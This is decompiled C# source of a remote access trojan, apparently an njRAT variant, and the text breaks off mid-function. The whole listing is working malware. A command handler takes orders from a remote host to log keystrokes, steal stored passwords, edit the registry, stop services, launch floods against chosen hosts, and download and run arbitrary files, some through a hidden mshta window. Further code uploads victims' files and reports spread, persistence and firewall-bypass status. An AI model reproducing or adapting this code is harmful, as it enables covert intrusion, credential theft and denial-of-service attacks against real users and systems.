using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using n.My;
using n.My.Resources;

namespace n;

[StandardModule]
internal sealed class IND
{
	public delegate void indd(string T);

	public class UL
	{
		public string F;

		public int sock;

		private TcpClient k;

		public int PZ;

		private byte[] bb;

		private int fz;

		private int sd;

		private bool rc;

		public UL()
		{
			k = new TcpClient();
			PZ = -1;
			rc = false;
		}

		public void R()
		{
			checked
			{
				try
				{
					fz = (int)FileSystem.FileLen(API.DEB(ref F));
					string data = "#26" + Y + Conversions.ToString(sock) + Y + F + Y + Conversions.ToString(fz) + "nj-q8";
					byte[] array = MyProject.Forms.B.WC.STB(data);
					k.Client.Send(array, array.Length, SocketFlags.None);
					do
					{
						Thread.Sleep(1);
					}
					while (k.Client.Available <= 0);
					byte[] array2 = new byte[k.Client.Available + 1];
					k.Client.Receive(array2, array2.Length, SocketFlags.None);
					PZ = Conversions.ToInteger(MyProject.Forms.B.WC.BTS(array2).Replace("nj-q8", ""));
					if (PZ != -1)
					{
						MemoryStream memoryStream = new MemoryStream();
						memoryStream.Write(bb, PZ, bb.Length - PZ);
						k.Client.Send(memoryStream.ToArray(), memoryStream.ToArray().Length, SocketFlags.None);
					}
					try
					{
						k.Close();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					bb = null;
					rc = true;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}

		public void w()
		{
			while (true)
			{
				Thread.Sleep(1);
				if (rc)
				{
					break;
				}
				if (k == null)
				{
					continue;
				}
				try
				{
					if (k.Client.Poll(-1, SelectMode.SelectRead) & (k.Client.Available <= 0))
					{
						Thread thread = new Thread(start);
						try
						{
							k.Client.Close();
							k.Close();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						k = new TcpClient();
						thread.Start();
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
					break;
				}
			}
		}

		public void start()
		{
			try
			{
				if (!rc)
				{
					bb = File.ReadAllBytes(API.DEB(ref F));
					k.Client.ReceiveBufferSize = 999999;
					k.Client.SendBufferSize = 999999;
					k.Client.ReceiveTimeout = -1;
					k.Client.SendTimeout = -1;
					k.Client.Connect(B.no.Split(new char[1] { ':' })[0], Conversions.ToInteger(B.no.Split(new char[1] { ':' })[1]));
					Thread thread = new Thread(R);
					thread.Start();
					Thread thread2 = new Thread(w);
					thread2.Start();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string TM = Interaction.Environ("temp") + "\\";

	public static string Y = "^:^";

	public static int LPING;

	public static chat Ca = new chat();

	private static byte[] Cdll;

	private const int MOUSEEVENTF_ABSOLUTE = 32768;

	private const int MOUSEEVENTF_LEFTDOWN = 2;

	private const int MOUSEEVENTF_LEFTUP = 4;

	private const int MOUSEEVENTF_MOVE = 1;

	private const int MOUSEEVENTF_MIDDLEDOWN = 32;

	private const int MOUSEEVENTF_MIDDLEUP = 64;

	private const int MOUSEEVENTF_RIGHTDOWN = 8;

	private const int MOUSEEVENTF_RIGHTUP = 16;

	static IND()
	{
		byte[] cam = Resources.Cam;
		bool CM = false;
		Cdll = (byte[])API.ZIP(cam, ref CM).Clone();
	}

	public static void inddd(string T)
	{
		RichTextBox t = B.Chat.T1;
		t.set_Text(t.get_Text() + B.Chat.nick + " : " + T + "\r\n");
	}

	public static RegistryKey Rk(ref string p, ref bool W)
	{
		Array array = Strings.Split(p, "\\", -1, (CompareMethod)0);
		object obj = NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null);
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CLASSES_ROOT", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_ClassesRoot().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CURRENT_USER", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_LOCAL_MACHINE", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_USERS", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_Users().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		if (Operators.ConditionalCompareObjectEqual(obj, (object)"HKEY_CURRENT_CONFIG", false))
		{
			return ((ServerComputer)MyProject.Computer).get_Registry().get_CurrentConfig().OpenSubKey(Strings.Replace(p, Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), "", 1, -1, (CompareMethod)0), W);
		}
		RegistryKey result = default(RegistryKey);
		return result;
	}

	public static void ind(byte[] Da)
	{
		//IL_08f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b46: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b4d: Expected O, but got Unknown
		//IL_1b63: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b69: Expected O, but got Unknown
		//IL_296f: Unknown result type (might be due to invalid IL or missing references)
		//IL_2976: Expected O, but got Unknown
		//IL_3c97: Unknown result type (might be due to invalid IL or missing references)
		//IL_3c9e: Expected O, but got Unknown
		//IL_3eaa: Unknown result type (might be due to invalid IL or missing references)
		//IL_3eb1: Expected O, but got Unknown
		int num = 0;
		string @string = Encoding.UTF8.GetString(Da);
		checked
		{
			int num2 = default(int);
			try
			{
				Array array = Strings.Split(@string, Y, -1, (CompareMethod)0);
				switch (NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null).ToString())
				{
				case "#KON":
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (object)"T", false))
					{
						B.KON = true;
					}
					else
					{
						B.KON = false;
					}
					break;
				case "#RG":
				{
					num = 1;
					object obj4 = NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null);
					if (Operators.ConditionalCompareObjectEqual(obj4, (object)"~", false))
					{
						object[] array4 = new object[1];
						object[] array38 = array4;
						int num4 = 2;
						array38[0] = 2;
						string V = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
						bool CM = false;
						RegistryKey registryKey = Rk(ref V, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, V }, (string[])null, true, false);
						RegistryKey registryKey2 = registryKey;
						string[] subKeyNames = registryKey2.GetSubKeyNames();
						string text16 = default(string);
						foreach (string text15 in subKeyNames)
						{
							string text17 = text16;
							V = text15 + Y + Y + "Key";
							text16 = text17 + API.ENB(ref V) + Y;
						}
						string[] valueNames = registryKey2.GetValueNames();
						foreach (string text18 in valueNames)
						{
							string text19 = registryKey2.GetValue(text18, RuntimeHelpers.GetObjectValue(new object()))!.ToString();
							if (text19.Length > 200)
							{
								text19 = Strings.Mid(text19, 1, 200);
							}
							string text20 = text16;
							V = text18 + Y + text19 + Y + "Value";
							text16 = text20 + API.ENB(ref V) + Y;
						}
						B b18 = MyProject.Forms.B;
						V = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(string.Concat("#RG" + Y, "~"), Y), NewLateBinding.LateIndexGet((object)array, new object[1] { 2 }, (string[])null)), (object)Y), (object)text16));
						b18.SEND(ref V);
					}
					else if (Operators.ConditionalCompareObjectEqual(obj4, (object)"!", false))
					{
						object[] array4 = new object[1];
						object[] array39 = array4;
						int num4 = 2;
						array39[0] = 2;
						string V = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
						bool CM = true;
						RegistryKey registryKey3 = Rk(ref V, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, V }, (string[])null, true, false);
						RegistryKey registryKey4 = registryKey3;
						registryKey4.SetValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)), RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 4 }, (string[])null)));
					}
					else if (Operators.ConditionalCompareObjectEqual(obj4, (object)"@", false))
					{
						object[] array4 = new object[1];
						object[] array40 = array4;
						int num4 = 2;
						array40[0] = 2;
						string V = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
						bool CM = true;
						RegistryKey registryKey5 = Rk(ref V, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, V }, (string[])null, true, false);
						RegistryKey registryKey6 = registryKey5;
						int num29 = array.Length - 1;
						for (int num30 = 3; num30 <= num29; num30++)
						{
							Array array41 = Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { num30 }, (string[])null)), "\\", -1, (CompareMethod)0);
							if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array41, new object[1] { 1 }, (string[])null), (object)"Key", false))
							{
								registryKey6.DeleteSubKeyTree(Conversions.ToString(NewLateBinding.LateIndexGet((object)array41, new object[1] { 0 }, (string[])null)));
							}
							else
							{
								registryKey6.DeleteValue(Conversions.ToString(NewLateBinding.LateIndexGet((object)array41, new object[1] { 0 }, (string[])null)));
							}
						}
					}
					else if (Operators.ConditionalCompareObjectEqual(obj4, (object)"#", false))
					{
						object[] array4 = new object[1];
						object[] array42 = array4;
						int num4 = 2;
						array42[0] = 2;
						string V = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
						bool CM = true;
						RegistryKey registryKey7 = Rk(ref V, ref CM);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 2, V }, (string[])null, true, false);
						RegistryKey registryKey8 = registryKey7;
						registryKey8.CreateSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 3 }, (string[])null)));
					}
					break;
				}
				case "#k":
				{
					num = 1;
					string V = "lg";
					string N = "..";
					string s2 = NK.GetValue(ref V, ref N);
					B b17 = MyProject.Forms.B;
					N = "#k" + Y + API.ENB(ref s2);
					b17.SEND(ref N);
					break;
				}
				case "#X":
				{
					num = 0;
					int num18 = 8 + NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null).ToString()!.Length;
					MemoryStream memoryStream11 = new MemoryStream();
					memoryStream11.Write(Da, num18, Da.Length - num18);
					byte[] b11 = memoryStream11.ToArray();
					bool CM = false;
					byte[] bytes = API.ZIP(b11, ref CM);
					int num19 = 0;
					do
					{
						if (File.Exists(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)))))
						{
							try
							{
								File.Delete(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))));
								File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))), bytes);
								NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) }, (string[])null, (Type[])null, (bool[])null, true);
								break;
							}
							catch (Exception ex11)
							{
								ProjectData.SetProjectError(ex11, num2);
								ProjectData.ClearProjectError();
							}
							num19++;
							continue;
						}
						File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null))), bytes);
						NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.ConcatenateObject((object)string.Concat(TM + Conversions.ToString(num19), "."), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)) }, (string[])null, (Type[])null, (bool[])null, true);
						break;
					}
					while (num19 <= 999);
					break;
				}
				case "##":
				{
					num = 5;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().SetValue("p", RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)));
					B b21 = MyProject.Forms.B;
					string N = "plugin";
					b21.SEND(ref N);
					break;
				}
				case "#Rec":
					break;
				case "#ser0":
				{
					num = 1;
					ServiceController[] services2 = ServiceController.GetServices();
					string text12 = default(string);
					string N;
					foreach (ServiceController val5 in services2)
					{
						string text13 = text12;
						string y = Y;
						N = val5.get_ServiceName() + "{}" + Strings.Replace(Strings.Replace(Conversions.ToString(val5.get_CanStop()), Conversions.ToString(true), "Yes", 1, -1, (CompareMethod)0), Conversions.ToString(false), "No", 1, -1, (CompareMethod)0) + "{}" + ((Enum)val5.get_Status()).ToString() + "{}" + val5.get_DisplayName();
						text12 = text13 + y + API.ENB(ref N);
					}
					B b15 = MyProject.Forms.B;
					N = "#ser0" + text12;
					b15.SEND(ref N);
					break;
				}
				case "#ser1":
				{
					num = 1;
					ServiceController[] services3 = ServiceController.GetServices();
					foreach (ServiceController val8 in services3)
					{
						if (Operators.ConditionalCompareObjectEqual((object)val8.get_ServiceName(), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), false))
						{
							val8.Start();
						}
					}
					break;
				}
				case "#ser2":
				{
					num = 1;
					ServiceController[] services = ServiceController.GetServices();
					foreach (ServiceController val2 in services)
					{
						if (Operators.ConditionalCompareObjectEqual((object)val2.get_ServiceName(), NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), false))
						{
							val2.Stop();
						}
					}
					break;
				}
				case "#R":
				{
					num = 0;
					string N = "vname";
					object[] array4 = new object[1];
					object[] array5 = array4;
					int num4 = 1;
					array5[0] = 1;
					string V = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					NK.SetValue(ref N, ref V);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, V }, (string[])null, true, false);
					B.Vname = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					B b4 = MyProject.Forms.B;
					N = "#R" + Y + B.Vname;
					b4.SEND(ref N);
					break;
				}
				case "ping":
				{
					B b29 = MyProject.Forms.B;
					string N = "pong";
					b29.SEND(ref N);
					break;
				}
				case "#0":
				{
					num = 0;
					B b25 = MyProject.Forms.B;
					string N = "#red";
					b25.SEND(ref N);
					FLD fLD2 = new FLD();
					object[] array4 = new object[1];
					object[] array71 = array4;
					int num4 = 1;
					array71[0] = 1;
					N = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string text43 = API.DEB(ref N);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, N }, (string[])null, true, false);
					fLD2.HOST = Strings.Split(text43, Y, -1, (CompareMethod)0)[0];
					array4 = new object[1];
					object[] array72 = array4;
					num4 = 1;
					array72[0] = 1;
					N = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string text44 = API.DEB(ref N);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, N }, (string[])null, true, false);
					fLD2.Port = Conversions.ToInteger(Strings.Split(text44, Y, -1, (CompareMethod)0)[1]);
					fLD2.pk = new byte[1001];
					array4 = new object[1];
					object[] array73 = array4;
					num4 = 1;
					array73[0] = 1;
					N = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string text45 = API.DEB(ref N);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, N }, (string[])null, true, false);
					fLD2.Count = Conversions.ToInteger(Strings.Split(text45, Y, -1, (CompareMethod)0)[2]);
					bool CM = false;
					fLD2.Start(ref CM);
					B b26 = MyProject.Forms.B;
					N = "#Bla";
					b26.SEND(ref N);
					break;
				}
				case "#1":
				{
					num = 0;
					B b23 = MyProject.Forms.B;
					string N = "#red";
					b23.SEND(ref N);
					FLD fLD = new FLD();
					object[] array4 = new object[1];
					object[] array65 = array4;
					int num4 = 1;
					array65[0] = 1;
					N = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string text37 = API.DEB(ref N);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, N }, (string[])null, true, false);
					fLD.HOST = Strings.Split(text37, Y, -1, (CompareMethod)0)[0];
					array4 = new object[1];
					object[] array66 = array4;
					num4 = 1;
					array66[0] = 1;
					N = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string text38 = API.DEB(ref N);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, N }, (string[])null, true, false);
					fLD.Port = Conversions.ToInteger(Strings.Split(text38, Y, -1, (CompareMethod)0)[1]);
					fLD.pk = new byte[1001];
					array4 = new object[1];
					object[] array67 = array4;
					num4 = 1;
					array67[0] = 1;
					N = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
					string text39 = API.DEB(ref N);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, N }, (string[])null, true, false);
					fLD.Count = Conversions.ToInteger(Strings.Split(text39, Y, -1, (CompareMethod)0)[2]);
					bool CM = true;
					fLD.Start(ref CM);
					B b24 = MyProject.Forms.B;
					N = "#Bla";
					b24.SEND(ref N);
					break;
				}
				case "#2":
				{
					num = 0;
					string text33 = "." + Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), ".", -1, (CompareMethod)0)[Strings.Split(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null)), ".", -1, (CompareMethod)0).Length - 1];
					int num36 = 0;
					int num37 = default(int);
					do
					{
						IL_0f46:
						if (File.Exists(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num36) + text33))
						{
							try
							{
								File.Delete(Interaction.Environ("appdata") + "\\" + Conversions.ToString(num36) + text33);
								num37++;
								if (num37 > 5)
								{
									break;
								}
							}
							catch (Exception ex18)
							{
								ProjectData.SetProjectError(ex18, num2);
								ProjectData.ClearProjectError();
								goto IL_0f34;
							}
							goto IL_0f46;
						}
						string text34 = Interaction.Environ("appdata") + "\\" + Conversions.ToString(num36) + text33;
						Network network = ((ServerComputer)MyProject.Computer).get_Network();
						object[] array52 = new object[2];
						object[] array53 = array52;
						object[] array4 = new object[1];
						object[] array54 = array4;
						int num4 = 1;
						array54[0] = 1;
						array53[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
						array52[1] = text34;
						object[] array55 = array52;
						object[] array56 = array55;
						bool[] array57 = new bool[2] { true, true };
						NewLateBinding.LateCall((object)network, (Type)null, "DownloadFile", array56, (string[])null, (Type[])null, array57, true);
						if (array57[0])
						{
							NewLateBinding.LateIndexSetComplex((object)array, new object[2]
							{
								num4,
								RuntimeHelpers.GetObjectValue(array55[0])
							}, (string[])null, true, false);
						}
						if (array57[1])
						{
							text34 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array55[1]), typeof(string));
						}
						Process.Start(text34);
						break;
						IL_0f34:
						num36++;
					}
					while (num36 <= 9999);
					break;
				}
				case "#3":
				{
					num = 0;
					MemoryStream memoryStream16 = new MemoryStream();
					byte[] bytes2 = Encoding.Default.GetBytes("#4" + Y);
					memoryStream16.Write(bytes2, 0, bytes2.Length);
					Encoding @default = Encoding.Default;
					string N = "plugin.C";
					string V = "Pass";
					object P = null;
					string lpstrReturnString = Conversions.ToString(C.inv(ref C.Plug, ref N, ref V, ref P));
					byte[] bytes3 = @default.GetBytes(API.ENB(ref lpstrReturnString));
					bool CM = true;
					bytes2 = API.ZIP(bytes3, ref CM);
					memoryStream16.Write(bytes2, 0, bytes2.Length);
					MyProject.Forms.B.WC.SendData(memoryStream16.ToArray());
					break;
				}
				case "#4":
					num = 0;
					try
					{
						MyProject.Forms.B.BW.B.Dispose();
						A.fj.Dispose();
					}
					catch (Exception ex6)
					{
						ProjectData.SetProjectError(ex6, num2);
						ProjectData.ClearProjectError();
					}
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null), (object)"!", false))
					{
						NK.CLEAR();
						try
						{
							DriveInfo[] drives = DriveInfo.GetDrives();
							foreach (DriveInfo driveInfo in drives)
							{
								if (!driveInfo.IsReady || driveInfo.TotalFreeSpace <= 0L)
								{
									continue;
								}
								try
								{
									if (File.Exists(driveInfo.Name + B.Uo))
									{
										File.Delete(driveInfo.Name + B.Uo);
									}
								}
								catch (Exception ex7)
								{
									ProjectData.SetProjectError(ex7, num2);
									ProjectData.ClearProjectError();
								}
							}
						}
						catch (Exception ex8)
						{
							ProjectData.SetProjectError(ex8, num2);
							ProjectData.ClearProjectError();
						}
						Process[] processesByName = Process.GetProcessesByName("wscript");
						foreach (Process process3 in processesByName)
						{
							try
							{
								process3.Kill();
							}
							catch (Exception ex9)
							{
								ProjectData.SetProjectError(ex9, num2);
								ProjectData.ClearProjectError();
							}
						}
						try
						{
							string path4 = Application.get_StartupPath() + "\\j.vbs";
							string lpstrReturnString = Resources.W;
							File.WriteAllText(path4, API.DEB(ref lpstrReturnString).Replace("NJ", Application.get_ExecutablePath()));
							Process.Start(Application.get_StartupPath() + "\\j.vbs");
						}
						catch (Exception ex10)
						{
							ProjectData.SetProjectError(ex10, num2);
							ProjectData.ClearProjectError();
						}
					}
					ProjectData.EndApp();
					break;
				case "#5":
				{
					num = 0;
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = "mshta.exe";
					processStartInfo.Arguments = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { 1 }, (string[])null));
					processStartInfo.CreateNoWindow = true;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					Process process2 = Process.Start(processStartInfo);
					Thread.Sleep(60000);
					try
					{
						process2.Kill();
						break;
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5, num2);
						ProjectData.ClearProjectError();
						break;
					}
				}
				case "#6":
					num = 0;
					try
					{
						MyProject.Forms.B.BW.B.Dispose();
						if (A.fj.Id > 1)
						{
							A.fj.Kill();
						}
					}
					catch (Exception ex4)
					{
						ProjectData.SetProjectError(ex4, num2);
						ProjectData.ClearProjectError();
					}
					Process.Start(Application.get_ExecutablePath());
					ProjectData.EndApp();
					break;
				case "#7":
				{
					num = 2;
					object[] array14 = new object[1];
					object[] array75 = array14;
					int num4 = 1;
					array75[0] = 1;
					int num5 = Conversions.ToInteger(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					byte[] array76 = sc.gc(ref num5);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, num5 }, (string[])null, true, false);
					byte[] array77 = array76;
					if (array77.Length == 0)
					{
						B b28 = MyProject.Forms.B;
						string lpstrReturnString = "#5" + Y + Conversions.ToString(0);
						b28.SEND(ref lpstrReturnString);
					}
					else
					{
						MemoryStream memoryStream17 = new MemoryStream();
						memoryStream17.Write(Encoding.Default.GetBytes("#6" + Y), 0, Y.Length + 2);
						memoryStream17.Write(array77, 0, array77.Length);
						MyProject.Forms.B.WC.SendData(memoryStream17.ToArray());
					}
					break;
				}
				case "#8":
				{
					string text46 = "\r\n";
					string text47 = text47 + "PC InfoX*X==" + text46;
					text47 = text47 + "PC\\UserX*X" + B.PC + text46;
					text47 = text47 + "CountryX*X" + API.Gc() + text46;
					text47 = text47 + "OSX*X" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName().Replace("Windows", "")
						.Replace("  ", " ")
						.Replace("Microsoft", "")
						.Replace("®", "")
						.Replace("™", "") + text46;
					text47 = Conversions.ToString(Operators.AddObject((object)text47, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"ProcessorX*X", ((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")!.GetValue("~mhz")), (object)" *"), (object)Environment.ProcessorCount), (object)"~MHZ"), (object)text46)));
					text47 = text47 + "RAMX*X" + Strings.Format((object)((double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1073741824.0), "#0.00 GB") + text46;
					text47 = text47 + "UpTimeX*X" + Strings.Split(Strings.Mid(Conversions.ToString((double)Environment.TickCount / 3600000.0), 1, 5), ".", -1, (CompareMethod)0)[0] + " :Hours" + text46;
					text47 = text47 + "Server InfoX*X==" + text46;
					text47 = text47 + "ServerX*X" + API.DEB(ref B.Vname) + "_" + sc.HWD() + text46;
					text47 = text47 + "Host:PortX*X" + B.no + text46;
					text47 = text47 + "DirectoryX*X" + Application.get_StartupPath() + text46;
					text47 = text47 + "ExeNameX*X" + AppDomain.CurrentDomain.FriendlyName + text46;
					text47 = text47 + "Process IDX*X" + Conversions.ToString(Process.GetCurrentProcess().Id) + text46;
					text47 = text47 + "StartupX*X" + B.SU + text46;
					text47 = text47 + "PersistantX*X" + Conversions.ToString(B.UU) + text46;
					text47 = text47 + "SpreadX*X" + B.spread + text46;
					text47 = text47 + "MutexX*X" + B.mU + text46;
					text47 = text47 + "First RunX*X" + B.FR + text46;
					text47 = text47 + "RegKeyX*X" + NK.Key + text46;
					text47 = text47 + "Firewall BypassX*X" + Strings.Replace(B.Fw.ToString(), "True", "Yes", 1, -1, (CompareMethod)0).Replace("False", "No");
					B b27 = MyProject.Forms.B;
					string lpstrReturnString = "#7" + Y + API.ENB(ref text47);
					b27.SEND(ref lpstrReturnString);
					break;
				}
				case "#9":
				{
					num = 1;
					DriveInfo[] drives2 = DriveInfo.GetDrives();
					string text35 = default(string);
					string lpstrReturnString;
					foreach (DriveInfo driveInfo2 in drives2)
					{
						if (driveInfo2.IsReady)
						{
							string text36 = text35;
							string y7 = Y;
							lpstrReturnString = driveInfo2.Name;
							text35 = text36 + y7 + API.ENB(ref lpstrReturnString);
						}
					}
					B b22 = MyProject.Forms.B;
					string[] array12 = new string[8] { "#8", text35, Y, null, null, null, null, null };
					string[] array62 = array12;
					string V = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();
					array62[3] = API.ENB(ref V);
					array12[4] = Y;
					string[] array63 = array12;
					string N = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments();
					array63[5] = API.ENB(ref N);
					array12[6] = Y;
					string[] array64 = array12;
					lpstrReturnString = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					array64[7] = API.ENB(ref lpstrReturnString);
					string lpstrCommand = string.Concat(array12);
					b22.SEND(ref lpstrCommand);
					break;
				}
				case "#10":
				{
					num = 1;
					object[] array14 = new object[1];
					object[] array43 = array14;
					int num5 = 1;
					array43[0] = 1;
					string lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					string path12 = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					string[] directories = Directory.GetDirectories(path12);
					string text22 = default(string);
					foreach (string text21 in directories)
					{
						string text23 = text22;
						string y3 = Y;
						object[] array4 = new object[1];
						object[] array44 = array4;
						int num4 = 1;
						array44[0] = 1;
						string lpstrReturnString = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array4, (string[])null));
						string text24 = API.DEB(ref lpstrReturnString);
						NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrReturnString }, (string[])null, true, false);
						string N = Strings.Replace(text21, text24, "", 1, -1, (CompareMethod)0) + "*DIR";
						text22 = text23 + y3 + API.ENB(ref N);
					}
					string[] array45 = new string[5] { "png", "jpg", "jpeg", "bmp", "ico" };
					int num32 = 0;
					array14 = new object[1];
					object[] array46 = array14;
					num5 = 1;
					array46[0] = 1;
					lpstrCommand = Conversions.ToString(NewLateBinding.LateIndexGet((object)array, array14, (string[])null));
					string path13 = API.DEB(ref lpstrCommand);
					NewLateBinding.LateIndexSetComplex((object)array, new object[2] { 1, lpstrCommand }, (string[])null, true, false);
					string[] files = Directory.GetFiles(path13);
					bool flag = default(bool);
					foreach (string text25 in files)
					{
						string[] array47 = array45;
						foreach (string text26 in array47)
						{
